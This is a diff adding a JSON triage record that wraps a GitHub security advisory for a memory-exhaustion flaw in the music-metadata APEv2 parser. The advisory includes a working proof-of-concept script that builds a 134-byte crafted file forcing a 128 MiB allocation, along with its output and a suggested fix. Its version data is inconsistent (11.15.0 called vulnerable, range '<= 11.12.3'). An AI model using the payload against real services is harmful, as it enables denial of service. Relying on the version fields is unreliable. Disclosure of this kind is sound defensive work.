@@ -1,0 +1,59 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"comments\": 3, \"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/97537483?v=4\", \"events_url\": \"https://api.github.com/users/Zwique/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Zwique/followers\", \"following_url\": \"https://api.github.com/users/Zwique/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Zwique/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Zwique\", \"id\": 97537483, \"login\": \"Zwique\", \"node_id\": \"U_kgDOBdBNyw\", \"organizations_url\": \"https://api.github.com/users/Zwique/orgs\", \"received_events_url\": \"https://api.github.com/users/Zwique/received_events\", \"repos_url\": \"https://api.github.com/users/Zwique/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Zwique/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Zwique/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Zwique\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-107387\", \"cvss\": {\"score\": 6.2, \"vector_string\": \"CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 6.2, \"vector_string\": \"CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-789\", \"name\": \"Memory Allocation with Excessive Size Value\"}], \"description\": \"## Summary\\n\\n`music-metadata` 11.15.0 is vulnerable to uncontrolled memory allocation in the APEv2 parser.\\n\\nThe parser reads the size of an APEv2 tag item from the input file and uses that value to allocate memory before checking whether the file actually contains that many bytes. A small crafted `.ape` file can declare a very large binary tag item, such as cover art, and force the parser to allocate a large buffer.\\n\\nThis issue is specific to APEv2 parsing and is separate from the ID3v2, MP4, and EBML advisories.\\n\\n## Affected component\\n\\n- `lib/apev2/APEv2Token.ts`\\n- `lib/apev2/APEv2Parser.ts`\\n\\nThe untrusted size is read here:\\n\\n```ts\\nsize: Token.UINT32_LE.get(buf, off)\\n```\\n\\nIt is later used directly for allocation when parsing binary tag items:\\n\\n```ts\\nconst picData = new Uint8Array(tagItemHeader.size);\\nawait this.tokenizer.readBuffer(picData);\\n```\\n\\nThe allocation happens before the parser confirms that the declared size fits inside the remaining file data.\\n\\n## Impact\\n\\nAn application that parses untrusted `.ape` files with `music-metadata` may be vulnerable to denial of service through memory exhaustion.\\n\\nThe demonstrated payload is only 134 bytes but causes a 128 MiB allocation with default options. Concurrent or repeated parses can multiply the memory impact.\\n\\nThe impact is limited to availability. No confidentiality or integrity impact has been demonstrated.\\n\\n## Proof of Concept\\n\\nRun from the project checkout after compiling the source:\\n\\n```bash\\nnpm install --ignore-scripts\\nnpm run compile-src:dev\\nnode --expose-gc poc-apev2-memory.mjs\\n```\\n\\n`poc-apev2-memory.mjs`:\\n\\n```js\\nimport { parseBuffer } from './lib/core.js';\\n\\nconst le16 = n => Uint8Array.from([n & 255, n >>> 8]);\\nconst le32 = n => Uint8Array.from([n & 255, n >>> 8 & 255, n >>> 16 & 255, n >>> 24]);\\nconst cat = (...parts) => {\\n  const out = new Uint8Array(parts.reduce((n, p) => n + p.length, 0));\\n  let off = 0;\\n  for (const p of parts) out.set(p, off), off += p.length;\\n  return out;\\n};\\n\\nconst big = 0x08000000; // 128 MiB\\n\\nconst desc = cat(\\n  Buffer.from('MAC '), le32(4000), le32(52), le32(24),\\n  le32(0), le32(0), le32(0), le32(0), le32(0), new Uint8Array(16)\\n);\\n\\nconst hdr = cat(\\n  le16(0), le16(0), le32(1), le32(1), le32(1),\\n  le16(16), le16(1), le32(44100)\\n);\\n\\nconst key = Buffer.from('Cover Art (Front)\\\\0', 'ascii');\\nconst item = cat(le32(big), le32(2));\\n\\nconst tag = cat(\\n  Buffer.from('APETAGEX'),\\n  le32(2000),\\n  le32(32 + item.length + key.length + big),\\n  le32(1),\\n  le32(0),\\n  new Uint8Array(8)\\n);\\n\\nconst payload = cat(desc, hdr, tag, item, key);\\n\\nif (global.gc) global.gc();\\nconst before = process.memoryUsage();\\n\\ntry {\\n  await parseBuffer(payload, { mimeType: 'audio/ape' });\\n} catch (error) {\\n  console.log(error.constructor.name + ': ' + error.message);\\n}\\n\\nconst after = process.memoryUsage();\\nconsole.log('input bytes:', payload.byteLength);\\nconsole.log('arrayBuffers delta MB:', ((after.arrayBuffers - before.arrayBuffers) / 1024 / 1024).toFixed(2));\\n```\\n\\n## Observed result\\n\\nOn `music-metadata` 11.15.0:\\n\\n```text\\nEndOfStreamError: End-Of-Stream\\ninput bytes: 134\\narrayBuffers delta MB: 128.00\\n```\\n\\nThe parser throws after reaching end-of-stream, but the large allocation has already happened.\\n\\n## Expected result\\n\\nThe parser should reject the malformed APEv2 tag before allocating memory for the declared item size.\\n\\n## Suggested fix\\n\\nValidate `tagItemHeader.size` before allocation. The parser should reject tag item sizes that exceed the remaining tag/file data or a reasonable maximum size. Binary items should not allocate `tagItemHeader.size` until the size has been checked.\", \"ghsa_id\": \"GHSA-53v6-4h7p-p4gj\", \"github_reviewed_at\": \"2026-10-08T19:43:22Z\", \"html_url\": \"https://github.com/advisories/GHSA-53v6-4h7p-p4gj\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-53v6-4h7p-p4gj\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-107387\"}], \"nvd_published_at\": null, \"published_at\": \"2026-10-08T19:43:22Z\", \"references\": [\"https://github.com/Borewit/music-metadata/security/advisories/GHSA-53v6-4h7p-p4gj\", \"https://github.com/Borewit/music-metadata/pull/2744\", \"https://github.com/Borewit/music-metadata/commit/b3bf52cb6021b046f33ba47583e19ab8f10dd235\", \"https://github.com/Borewit/music-metadata/releases/tag/v11.16.0\", \"https://github.com/advisories/GHSA-53v6-4h7p-p4gj\"], \"repository_advisory_url\": \"https://api.github.com/repos/Borewit/music-metadata/security-advisories/GHSA-53v6-4h7p-p4gj\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/Borewit/music-metadata\", \"summary\": \"music-metadata: Uncontrolled memory allocation in APEv2 parser\", \"type\": \"reviewed\", \"updated_at\": \"2026-10-08T19:43:23Z\", \"url\": \"https://api.github.com/advisories/GHSA-53v6-4h7p-p4gj\", \"vulnerabilities\": [{\"first_patched_version\": \"11.16.0\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"music-metadata\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 11.12.3\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-53v6-4h7p-p4gj",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "music-metadata: <= 11.12.3"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-107387"
+    ],
+    "cvss_score": 6.2,
+    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "music-metadata"
+    ],
+    "remote": false,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-10-09T19:14:15.397786Z",
+  "provenance": {
+    "content_sha256": "8e23724386a5b601a32ebbd886b6d094440ed9fc685ae7df51e84088be654906",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-10-08T19:43:22Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-53v6-4h7p-p4gj",
+  "status": "active",
+  "title": "music-metadata: Uncontrolled memory allocation in APEv2 parser",
+  "updated_at": "2026-10-08T19:43:23Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-53v6-4h7p-p4gj"
+}
